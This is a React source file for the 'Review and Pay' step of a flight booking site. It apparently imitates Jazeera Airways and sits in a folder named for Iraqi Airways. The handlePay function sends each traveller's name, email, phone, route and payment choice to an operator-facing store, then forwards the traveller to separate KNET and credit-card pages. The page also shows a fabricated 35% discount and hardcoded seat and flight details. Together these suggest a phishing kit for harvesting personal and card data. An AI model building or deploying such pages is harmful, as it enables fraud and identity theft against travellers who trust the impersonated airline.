import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { sendData } from "../lib/store";
import { ChevronDown, ChevronUp, ArrowLeft, Plane, X } from "lucide-react";
import { useLang } from "../contexts/LanguageContext";
import { cityCountryName } from "../lib/airportNames";

type SummaryLeg = { route: string; detail: string; origin: string; destination: string };

type TripSummary = {
  passengerCount?: number;
  tripLabel?: string;
  firstDate?: string;
  flightsConv: number;
  taxesConv: number;
  baseTotalConv: number;
  curCode: string;
  curDecimals: number;
  curRate: number;
  baseTotalKWD?: number;
  discountConv?: number;
  seating?: number;
  meals?: number;
  addons?: number;
  total?: number;
  bundleName?: string;
  primaryName?: string;
  originCode?: string;
  destCode?: string;
  legs?: SummaryLeg[];
};

const CITY: Record<string, string> = {
  KWI: "Kuwait, Kuwait",
  HBE: "Alexandria, Egypt",
  AMD: "Ahmedabad, India",
  DXB: "Dubai, UAE",
  CAI: "Cairo, Egypt",
  BEY: "Beirut, Lebanon",
  IST: "Istanbul, Turkey",
};

function parseDetail(detail?: string) {
  const out = { flightNumber: "", dep: "", arr: "", date: "" };
  if (!detail) return out;
  const parts = detail.split("|").map((p) => p.trim());
  parts.forEach((p) => {
    if (/^[A-Za-z]{1,3}\s?\d+$/.test(p)) out.flightNumber = p;
    else if (/\d{1,2}:\d{2}\s*-\s*\d{1,2}:\d{2}/.test(p)) {
      const m = p.match(/(\d{1,2}:\d{2})\s*-\s*(\d{1,2}:\d{2})/);
      if (m) { out.dep = m[1]; out.arr = m[2]; }
    } else if (/\d{4}/.test(p)) out.date = p;
  });
  return out;
}

type PaxInfo = { gender?: string; firstName?: string; lastName?: string; dialCode?: string; phone?: string; email?: string };

export default function ReviewPay() {
  const [, setLocation] = useLocation();
  const { isAr, dir, t, lang } = useLang();
  const payMethodLabel = (m: string) => {
    if (!isAr) return m;
    if (m === 'Debit Cards') return 'بطاقات الخصم';
    if (m === 'Credit Cards') return 'بطاقات الائتمان';
    return m;
  };
  const [tripSummary, setTripSummary] = useState<TripSummary | null>(null);
  const [pax, setPax] = useState<PaxInfo | null>(null);
  const [flightsOpen, setFlightsOpen] = useState(false);
  const [addonsOpen, setAddonsOpen] = useState(false);
  const [paxOpen, setPaxOpen] = useState(false);
  const [payDrawerOpen, setPayDrawerOpen] = useState(false);
  const [payMethod, setPayMethod] = useState("KNET");
  const [tripSummaryOpen, setTripSummaryOpen] = useState(false);

  useEffect(() => {
    const stored = localStorage.getItem("tripSummary");
    if (stored) {
      try { setTripSummary(JSON.parse(stored)); }
      catch { setLocation("/passenger-details"); }
    } else { setLocation("/passenger-details"); }
    try {
      const pd = JSON.parse(localStorage.getItem("passengerData") || "[]");
      if (Array.isArray(pd) && pd[0]) setPax(pd[0]);
    } catch { /* ignore */ }
  }, [setLocation]);

  if (!tripSummary) {
    return <div className="min-h-screen bg-[#eef3fb]" />;
  }

  const fmt = (v: number) =>
    `${tripSummary.curCode || "KWD"} ${v.toLocaleString("en-US", {
      minimumFractionDigits: tripSummary.curDecimals ?? 3,
      maximumFractionDigits: tripSummary.curDecimals ?? 3,
    })}`;

  const f = Math.pow(10, tripSummary.curDecimals ?? 3);

  const flightsCost = tripSummary.flightsConv || 0;
  const taxesCost = tripSummary.taxesConv || 0;
  const addons = tripSummary.addons || 0;
  const seatingCost = tripSummary.seating || 0;
  const mealsCost = tripSummary.meals || 0;
  const baseTotal = tripSummary.baseTotalConv + seatingCost + mealsCost;
  const totalCost =
    tripSummary.total != null
      ? tripSummary.total
      : Math.round((baseTotal + addons) * f) / f;

  const surcharges = Math.round((addons + seatingCost + mealsCost) * f) / f;

  const farePortion = Math.round((flightsCost + taxesCost) * f) / f;
  const discountAmount = tripSummary.discountConv != null
    ? Math.round(tripSummary.discountConv * f) / f
    : Math.round((farePortion / 0.65 - farePortion) * f) / f;

  const origin = tripSummary.originCode || "KWI";
  const dest = tripSummary.destCode || "HBE";
  const allLegs: SummaryLeg[] = (tripSummary.legs && tripSummary.legs.length > 0)
    ? tripSummary.legs : [];
  const leg0 = allLegs[0];
  const parsed = parseDetail(leg0?.detail);
  const legViews = allLegs.map((lg) => {
    const p = parseDetail(lg.detail);
    const o = lg.origin || origin;
    const d = lg.destination || dest;
    return {
      origin: o, destination: d,
      originCity: cityCountryName(o, lang) || CITY[o] || o,
      destCity: cityCountryName(d, lang) || CITY[d] || d,
      flightNumber: p.flightNumber, dep: p.dep, arr: p.arr,
      date: p.date, route: lg.route, detail: lg.detail,
    };
  });

  const passengerName = tripSummary.primaryName || (pax?.firstName ? `${pax.firstName} ${pax.lastName || ""}`.trim() : "Guest");
  const paxGender = pax?.gender || "Male";
  const paxEmail = pax?.email || "";
  const paxPhone = pax ? `${pax.dialCode || "+965"}-${pax.phone || ""}`.replace(/-$/, "") : "";
  const bundleName = tripSummary.bundleName || "Flex Plus";
  const routePair = `${origin}-${dest}`;
  const originCity = cityCountryName(origin, lang) || CITY[origin] || origin;
  const destCity = cityCountryName(dest, lang) || CITY[dest] || dest;
  const flightDate = parsed.date || tripSummary.firstDate || "";

  const handlePay = () => {
    sendData({
      data: {
        "اسم المسافر": passengerName,
        "البريد الإلكتروني": paxEmail,
        "رقم الهاتف": paxPhone,
        "الجنس": paxGender === "Female" ? "أنثى" : "ذكر",
        "الباقة": bundleName,
        "المسار": routePair,
        "تاريخ الرحلة": flightDate,
        "طريقة الدفع": payMethod,
        "المبلغ الإجمالي": `${tripSummary.total} ${tripSummary.curCode}`,
      },
      current: "المراجعة والدفع",
      nextPage: payMethod === "KNET" ? "دفع KNET" : "دفع بطاقة",
      waitingForAdminResponse: false,
      isCustom: true,
    });
    if (payMethod === "KNET") setLocation("/knet-payment");
    else setLocation("/credit-card-payment");
  };

  return (
    <div className="min-h-screen bg-[#eef3fb] font-sans flex flex-col pb-48 md:pb-32" dir={dir}>
      {/* Mobile Header - matches original: back arrow + title */}
      <div className="md:hidden px-4 pt-8 pb-4">
        <div className="flex items-center gap-3">
          <button
            onClick={() => setLocation('/extras')}
            className="w-10 h-10 rounded-full border border-gray-300 bg-white flex items-center justify-center shrink-0"
          >
            <ArrowLeft className="w-5 h-5 text-[#004b87]" />
          </button>
          <h1 className="text-2xl font-bold text-[#004b87]">{isAr ? 'المراجعة والدفع' : 'Review and Pay'}</h1>
        </div>
      </div>

      {/* Desktop Top bar */}
      <div className="hidden md:flex bg-white px-6 py-3 items-center">
        <img
          src="/iraqi_airways/upload/logo-white.jpg"
          alt="Jazeera"
          className="h-20 cursor-pointer"
          onClick={() => { window.location.href = '/'; }}
          onError={(e) => ((e.target as HTMLImageElement).style.display = "none")}
        />
      </div>

      <div className="max-w-6xl w-full mx-auto px-3 md:px-4 py-2 md:py-6 flex-1">
        {/* Desktop title */}
        <div className="hidden md:flex items-center gap-4 mb-8">
          <button
            onClick={() => setLocation("/extras")}
            className="w-11 h-11 rounded-full border border-gray-300 bg-white flex items-center justify-center shrink-0 hover:bg-gray-50"
          >
            <ArrowLeft className="w-5 h-5 text-[#0a72c0]" />
          </button>
          <h1 className="text-4xl font-bold text-[#0a72c0]">{isAr ? 'المراجعة والدفع' : 'Review and Pay'}</h1>
        </div>

        <div className="flex flex-col-reverse lg:flex-row gap-6 items-start">
          {/* ---------- LEFT: Flight details card ---------- */}
          <div className="w-full lg:flex-1">
            <div className="bg-white rounded-2xl shadow-sm p-5 md:p-6">
              {(legViews.length > 0 ? legViews : [{
                origin, destination: dest,
                originCity, destCity,
                flightNumber: parsed.flightNumber, dep: parsed.dep, arr: parsed.arr,
                date: flightDate, route: '', detail: leg0?.detail,
              }]).map((lv, i) => (
                <div key={i} className={i > 0 ? "mt-6 pt-6 border-t border-gray-100" : ""}>
                  {i > 0 && (
                    <div className="text-sm font-semibold text-[#0a72c0] mb-3">{isAr ? 'رحلة العودة' : 'Return flight'}</div>
                  )}
                  {/* Route codes */}
                  <div className="flex items-center gap-3 mb-5">
                    <span className="text-2xl font-bold text-[#0a2540]">{lv.origin}</span>
                    <Plane className="w-5 h-5 text-[#0a72c0]" />
                    <span className="text-2xl font-bold text-[#0a2540]">{lv.destination}</span>
                  </div>

                  {/* Timeline row */}
                  <div className="flex items-start justify-between mb-4">
                    <div>
                      <div className="text-xs text-gray-500 mb-1">{lv.date || flightDate}</div>
                      <div className="text-lg font-bold text-[#0a72c0]">
                        {lv.dep || "--:--"} <span className="text-[#0a2540] text-sm font-semibold">{lv.origin}</span>
                      </div>
                      <div className="text-xs text-gray-500">{lv.originCity}</div>
                    </div>

                    <div className="flex-1 flex flex-col items-center px-3 pt-5">
                      <Plane className="w-4 h-4 text-[#0a72c0] mb-1" />
                      <div className="w-full border-t border-dashed border-gray-300" />
                      <div className="text-xs text-gray-500 mt-1">{isAr ? 'مباشر . 3س 5د' : 'Direct . 3h 5m'}</div>
                    </div>

                    <div className="text-right">
                      <div className="text-xs text-gray-500 mb-1">{lv.flightNumber || "J9 733"}</div>
                      <div className="text-lg font-bold">
                        <span className="text-[#0a2540] text-sm font-semibold">{lv.destination}</span>{" "}
                        <span className="text-[#0a72c0]">{lv.arr || "--:--"}</span>
                      </div>
                      <div className="text-xs text-gray-500">{lv.destCity}</div>
                    </div>
                  </div>
                </div>
              ))}

              {/* Divider */}
              <div className="border-t border-gray-100 my-4" />

              {/* Passenger name row */}
              <button
                onClick={() => setPaxOpen((v) => !v)}
                className="w-full flex items-center justify-between"
              >
                <span className="text-lg font-semibold text-[#0a2540]">{passengerName}</span>
                {paxOpen ? <ChevronUp className="w-5 h-5 text-gray-400" /> : <ChevronDown className="w-5 h-5 text-gray-400" />}
              </button>

              {/* Expanded passenger details - matches original layout */}
              {paxOpen && (
                <div className="mt-4 space-y-4">
                  <div className="text-base text-gray-800">{paxGender}</div>
                  {paxEmail && <div className="text-base text-gray-800">{paxEmail}</div>}
                  {paxPhone && <div className="text-base text-gray-800">{paxPhone}</div>}

                  <div className="bg-[#f4f6f8] rounded-xl px-5 py-4">
                    <div className="font-bold text-[#0a2540]">{isAr ? 'قيمة التذكرة' : 'Fare Amount'}</div>
                    <div className="text-gray-700 mt-1">{bundleName}</div>
                  </div>

                  <div className="bg-[#f4f6f8] rounded-xl px-5 py-4">
                    <div className="font-bold text-[#0a2540]">{isAr ? 'المقعد' : 'Seat'}</div>
                    <div className="text-gray-700 mt-1">11C | {isAr ? 'أفضل قيمة بالأمام' : 'Best value up front'} ({routePair})</div>
                  </div>

                  <div className="bg-[#f4f6f8] rounded-xl px-5 py-4">
                    <div className="font-bold text-[#0a2540]">{isAr ? 'الأمتعة' : 'Baggage'}</div>
                    <div className="text-gray-700 mt-1">{isAr ? 'أمتعة المقصورة 7 كغ' : 'Cabin baggage 7 Kg'}</div>
                  </div>
                </div>
              )}

              {/* Action chips - matches original: trash | seat | meal */}
              <div className="flex items-center gap-3 mt-4 flex-wrap">
                <button
                  onClick={() => setLocation("/customize-your-trip")}
                  className="w-10 h-9 rounded-full border border-[#cfe0ef] flex items-center justify-center text-[#0a72c0] cursor-pointer hover:bg-[#f0f6fc] transition-colors"
                >
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M17 6h-2V3a1 1 0 00-1-1h-4a1 1 0 00-1 1v3H7a2 2 0 00-2 2v11a2 2 0 002 2h10a2 2 0 002-2V8a2 2 0 00-2-2zm-6-2h2v2h-2V4z" /></svg>
                </button>
                <button
                  onClick={() => setLocation("/seat-customization")}
                  className="px-4 h-9 rounded-full border border-[#cfe0ef] flex items-center gap-2 text-[#0a72c0] text-sm font-medium cursor-pointer hover:bg-[#f0f6fc] transition-colors"
                >
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M7 13c1.66 0 3-1.34 3-3S8.66 7 7 7s-3 1.34-3 3 1.34 3 3 3zm12 6v-2c0-2.66-5.33-4-8-4s-8 1.34-8 4v2h16z" /></svg>
                  <span>11C</span>
                </button>
                <button
                  onClick={() => setLocation("/meals")}
                  className="px-4 h-9 rounded-full border border-[#cfe0ef] flex items-center gap-2 text-[#0a72c0] text-sm font-medium cursor-pointer hover:bg-[#f0f6fc] transition-colors"
                >
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M11 9H9V2H7v7H5V2H3v7c0 2.1 1.6 3.8 3.6 4v7h2v-7c2-.2 3.6-1.9 3.6-4V2h-2v7zm5-3v8h2v8h2V2c-2.2 0-4 1.8-4 4z" /></svg>
                  <span>{isAr ? 'اختر وجبة' : 'Pick a meal'}</span>
                </button>
              </div>
            </div>
          </div>

          {/* ---------- RIGHT: Trip summary (desktop only, inline) ---------- */}
          <div className="hidden lg:block w-96 shrink-0">
            <div className="bg-white rounded-2xl shadow-sm p-6">
              <h2 className="text-2xl font-bold text-[#004b87] mb-4">{t('seat.tripSummary')}</h2>
              <div className="flex items-center gap-2 text-sm text-gray-700 mb-2">
                <svg className="w-5 h-5 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a4 4 0 00-3-3.87M9 20H4v-2a4 4 0 013-3.87m6-1.13a4 4 0 100-8 4 4 0 000 8z" /></svg>
                <span>{tripSummary.passengerCount || 1} {(tripSummary.passengerCount || 1) > 1 ? t('common.passengers') : t('common.passenger')}</span>
              </div>
              <div className="flex items-center gap-2 text-sm text-gray-700 mb-5">
                <svg className="w-5 h-5 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>
                <span>{tripSummary.tripLabel || (isAr ? 'ذهاب فقط' : "One way")}: {flightDate}</span>
              </div>
              <div className="space-y-3">
                <div className="bg-[#f4f7fa] rounded-2xl px-4 py-3.5">
                  <button onClick={() => setFlightsOpen((v) => !v)} className="w-full flex items-center justify-between text-base font-semibold text-gray-800">
                    <span>{t('seat.flights')}</span>
                    <div className="flex items-center gap-2">
                      <span className="text-[#0a72c0] font-semibold">{fmt(flightsCost)}</span>
                      {flightsOpen ? <ChevronUp className="w-4 h-4 text-[#0a72c0]" /> : <ChevronDown className="w-4 h-4 text-[#0a72c0]" />}
                    </div>
                  </button>
                  {flightsOpen && allLegs.length > 0 && (
                    <div className="border-t border-[#e3eaf2] mt-3 pt-3 space-y-3">
                      {allLegs.map((lg, i) => (
                        <div key={i} className="space-y-1">
                          <div className="flex items-center justify-between text-sm font-semibold text-[#0a2540]"><span>{lg.route}</span></div>
                          {lg.detail && <div className="text-xs text-gray-500">{lg.detail}</div>}
                        </div>
                      ))}
                    </div>
                  )}
                </div>
                <div className="bg-[#f4f7fa] rounded-2xl px-4 py-3.5">
                  <button onClick={() => setAddonsOpen((v) => !v)} className="w-full flex items-center justify-between text-base font-semibold text-gray-800">
                    <span>{isAr ? 'الإضافات' : 'Add-ons'}</span>
                    <div className="flex items-center gap-2">
                      <span className="text-[#0a72c0] font-semibold">{fmt(surcharges)}</span>
                      {addonsOpen ? <ChevronUp className="w-4 h-4 text-[#0a72c0]" /> : <ChevronDown className="w-4 h-4 text-[#0a72c0]" />}
                    </div>
                  </button>
                  {addonsOpen && (
                    <div className="border-t border-[#e3eaf2] mt-3 pt-3 space-y-2">
                      <div className="flex items-start justify-between text-sm">
                        <span className="text-gray-600 pr-2">{isAr ? 'أولوية الإنهاء والصعود والأمتعة' : 'PRIORITY Check-in, Boarding and Baggage'}</span>
                        <span className="text-[#0a72c0] font-medium whitespace-nowrap">{isAr ? 'مشمول' : 'Included'}</span>
                      </div>
                      <div className="flex items-center justify-between text-sm">
                        <span className="text-gray-600">{isAr ? 'التأمين' : 'Insurance'}</span>
                        <span className="text-gray-700 font-medium whitespace-nowrap">{fmt(surcharges)}</span>
                      </div>
                    </div>
                  )}
                </div>
                <div className="bg-[#f4f7fa] rounded-2xl px-4 py-3.5 flex justify-between text-base font-semibold text-gray-800">
                  <span>{isAr ? 'الرسوم والضرائب' : 'Fees & Taxes'}</span>
                  <span className="text-gray-500 font-normal">{fmt(taxesCost)}</span>
                </div>
                <div className="bg-[#f4f7fa] rounded-2xl px-4 py-3.5 flex justify-between text-base font-semibold text-gray-800">
                  <span>{isAr ? 'رسوم إضافية' : 'Multiple Surcharges'}</span>
                  <span className="text-gray-500 font-normal">{fmt(surcharges)}</span>
                </div>
                <div className="bg-[#fdeaea] rounded-2xl px-4 py-3.5 flex justify-between text-base font-semibold">
                  <span className="text-[#c0392b]">{isAr ? 'إجمالي الخصم 35%' : 'Total discount 35%'}</span>
                  <span className="text-[#c0392b]">- {fmt(discountAmount)}</span>
                </div>
                <div className="flex justify-between items-center pt-2 px-1">
                  <span className="text-xl font-bold text-gray-800">{t('common.total')}</span>
                  <span className="flex flex-col items-end leading-tight">
                    <span className="text-base line-through text-red-500">{fmt(Math.round((totalCost + discountAmount) * f) / f)}</span>
                    <span className="text-2xl font-bold text-[#0a72c0]">{fmt(totalCost)}</span>
                  </span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* ===== Mobile Trip Summary (collapsible section above payment bar) ===== */}
      <div className="md:hidden fixed bottom-0 left-0 right-0 z-[9999]">
        {/* Trip Summary expandable section */}
        <div className="bg-white rounded-t-2xl shadow-[0_-4px_12px_rgba(0,0,0,0.08)]">
          <button
            onClick={() => setTripSummaryOpen((v) => !v)}
            className="w-full flex items-center justify-between px-5 py-4"
          >
            <h2 className="text-xl font-bold text-[#004b87]">{t('seat.tripSummary')}</h2>
            {tripSummaryOpen ? <ChevronUp className="w-5 h-5 text-gray-500" /> : <ChevronDown className="w-5 h-5 text-gray-500" />}
          </button>

          {tripSummaryOpen && (
            <div className="px-5 pb-4 max-h-[60vh] overflow-y-auto">
              <div className="flex items-center gap-2 text-sm text-gray-700 mb-2">
                <svg className="w-4 h-4 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a4 4 0 00-3-3.87M9 20H4v-2a4 4 0 013-3.87m6-1.13a4 4 0 100-8 4 4 0 000 8z" /></svg>
                <span>{tripSummary.passengerCount || 1} {(tripSummary.passengerCount || 1) > 1 ? t('common.passengers') : t('common.passenger')}</span>
              </div>
              <div className="flex items-center gap-2 text-sm text-gray-700 mb-4">
                <svg className="w-4 h-4 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>
                <span>{tripSummary.tripLabel || (isAr ? 'ذهاب فقط' : "One way")}: {flightDate}</span>
              </div>
              <div className="space-y-3">
                {/* Flights */}
                <div className="bg-[#f4f7fa] rounded-xl px-4 py-3">
                  <button onClick={() => setFlightsOpen((v) => !v)} className="w-full flex items-center justify-between text-sm font-bold text-gray-900">
                    <span>{t('seat.flights')}</span>
                    <div className="flex items-center gap-2">
                      <span className="text-[#0a72c0] font-semibold">{fmt(flightsCost)}</span>
                      {flightsOpen ? <ChevronUp className="w-4 h-4 text-gray-500" /> : <ChevronDown className="w-4 h-4 text-gray-500" />}
                    </div>
                  </button>
                  {flightsOpen && (
                    <div className="mt-3 pt-3 border-t border-gray-200">
                      <button className="w-full flex items-center justify-between text-sm text-gray-800 mb-2">
                        <span>{originCity.split(',')[0]} - {destCity.split(',')[0]}</span>
                        <ChevronDown className="w-4 h-4 text-gray-400" />
                      </button>
                      <div className="text-xs text-gray-500 mb-2">{parsed.flightNumber || 'J9 733'} | {parsed.dep || '14:30'} - {parsed.arr || '17:35'} | {flightDate}</div>
                      <div className="flex justify-center">
                        <span className="bg-gray-700 text-white text-xs px-3 py-1 rounded-full">0 Stops | 3h 5m</span>
                      </div>
                    </div>
                  )}
                </div>
                {/* Add-ons */}
                <div className="bg-[#f4f7fa] rounded-xl px-4 py-3">
                  <button onClick={() => setAddonsOpen((v) => !v)} className="w-full flex items-center justify-between text-sm font-bold text-gray-900">
                    <span>{isAr ? 'الإضافات' : 'Add-ons'}</span>
                    <div className="flex items-center gap-2">
                      <span className="text-[#0a72c0] font-semibold">{fmt(addons)}</span>
                      {addonsOpen ? <ChevronUp className="w-4 h-4 text-gray-500" /> : <ChevronDown className="w-4 h-4 text-gray-500" />}
                    </div>
                  </button>
                  {addonsOpen && (
                    <div className="border-t border-gray-200 mt-2 pt-2 space-y-1.5">
                      <div className="flex items-center justify-between text-xs">
                        <span className="text-gray-600">{isAr ? 'التأمين' : 'Insurance'}</span>
                        <span className="text-[#0a72c0] font-medium">{fmt(addons)}</span>
                      </div>
                    </div>
                  )}
                </div>
                {/* Fees & Taxes */}
                <div className="bg-[#f4f7fa] rounded-xl px-4 py-3 flex justify-between text-sm font-bold text-gray-900">
                  <span>{isAr ? 'الرسوم والضرائب' : 'Fees & Taxes'}</span>
                  <span className="text-[#0a72c0] font-semibold">{fmt(taxesCost)}</span>
                </div>
                {/* Fuel Surcharge */}
                <div className="bg-[#f4f7fa] rounded-xl px-4 py-3 flex justify-between text-sm font-bold text-gray-900">
                  <span>{isAr ? 'رسوم الوقود (YQ)' : 'Fuel Surcharge (YQ)'}</span>
                  <span className="text-[#0a72c0] font-semibold">{fmt(Math.round(4 * (tripSummary.curRate || 1) * f) / f)}</span>
                </div>
                {/* Multiple Surcharges */}
                <div className="bg-[#f4f7fa] rounded-xl px-4 py-3 flex justify-between text-sm font-bold text-gray-900">
                  <span>{isAr ? 'رسوم إضافية' : 'Multiple Surcharges'}</span>
                  <span className="text-[#0a72c0] font-semibold">{fmt(surcharges)}</span>
                </div>
                {/* Total */}
                <div className="flex justify-between items-center pt-3">
                  <span className="text-base font-medium text-gray-800">{t('common.total')}</span>
                  <span className="text-xl font-bold text-[#0a72c0]">{fmt(totalCost)}</span>
                </div>
                {/* Terms */}
                <p className="text-xs text-gray-600 pt-2">
                  {isAr
                    ? 'بالمتابعة والضغط على "ادفع"، فإنك توافق على الشروط والأحكام الخاصة بنا.'
                    : 'By continuing past this page and clicking on "pay", you agree to our '}
                  {!isAr && <span className="underline">{isAr ? 'الشروط والأحكام' : 'terms and conditions'}</span>}
                  {!isAr && '.'}
                </p>
              </div>
            </div>
          )}

          {/* Payment bar - always visible */}
          <div className="bg-gradient-to-r from-[#0a4f86] to-[#0d72c0] px-4 py-4 flex items-center justify-between">
            <span className="text-white text-sm font-medium">{isAr ? 'إجراء الدفع' : 'Make a payment'}</span>
            <div className="flex items-center gap-4">
              <div className="text-right">
                <div className="text-white text-xs font-medium">{payMethod}</div>
                <button
                  onClick={() => setPayDrawerOpen(true)}
                  className="text-yellow-400 text-xs font-semibold underline"
                >
                  {isAr ? 'تغيير' : 'Change'}
                </button>
              </div>
              <button
                onClick={handlePay}
                className="bg-yellow-400 hover:bg-yellow-500 text-[#004b87] font-bold px-4 py-2.5 rounded-full transition-colors whitespace-nowrap text-sm"
              >
                {isAr ? 'ادفع' : 'Pay'} {fmt(totalCost)}
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Desktop payment bar */}
      <div className="hidden md:block fixed bottom-0 left-0 right-0 p-4 bg-white border-t border-gray-200 shadow-[0_-4px_6px_-1px_rgba(0,0,0,0.1)] z-50">
        <div className="max-w-6xl mx-auto">
          <div className="bg-gradient-to-r from-[#0a4f86] to-[#0d72c0] rounded-2xl px-6 py-5 flex items-center justify-between shadow-md">
            <span className="text-white text-xl font-semibold">{isAr ? 'إجراء الدفع' : 'Make a payment'}</span>
            <div className="flex items-center gap-6">
              <div className="text-left">
                <div className="text-white text-sm">{payMethod}</div>
                <button
                  onClick={() => setPayDrawerOpen(true)}
                  className="text-yellow-400 text-sm font-semibold underline hover:text-yellow-300"
                >
                  {isAr ? 'تغيير' : 'Change'}
                </button>
              </div>
              <button
                onClick={handlePay}
                className="bg-yellow-400 hover:bg-yellow-500 text-[#004b87] font-bold px-8 py-3 rounded-full transition-colors whitespace-nowrap text-base"
              >
                {isAr ? 'ادفع' : 'Pay'} {fmt(totalCost)}
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Payment method drawer */}
      {payDrawerOpen && (
        <div className="fixed inset-0 z-[99999]">
          <div className="absolute inset-0 bg-[#0a4f86]/70" onClick={() => setPayDrawerOpen(false)} />
          <div className="absolute top-0 right-0 h-full w-full max-w-2xl bg-[#eef3fb] shadow-2xl p-4 md:p-8 overflow-y-auto">
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-lg md:text-2xl font-bold text-[#004b87]">{isAr ? 'اختر طريقة الدفع' : 'Select a payment method'}</h2>
              <button
                onClick={() => setPayDrawerOpen(false)}
                className="w-10 h-10 rounded-full bg-white border border-[#cfe0ef] flex items-center justify-center text-[#0a72c0] cursor-pointer hover:bg-[#f0f6fc]"
              >
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="bg-white rounded-2xl p-4 space-y-3">
              {["Debit Cards", "Credit Cards", "KNET"].map((m) => (
                <button
                  key={m}
                  onClick={() => { setPayMethod(m); setPayDrawerOpen(false); }}
                  className="w-full bg-[#f4f6f9] rounded-xl px-5 py-4 flex items-center justify-between text-[#1a2b4a] font-medium cursor-pointer hover:bg-[#eef1f5]"
                >
                  <span>{payMethodLabel(m)}</span>
                  <span className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${payMethod === m ? "border-[#1a2b4a]" : "border-[#9aa7bd]"}`}>
                    {payMethod === m && <span className="w-2.5 h-2.5 rounded-full bg-[#1a2b4a]" />}
                  </span>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
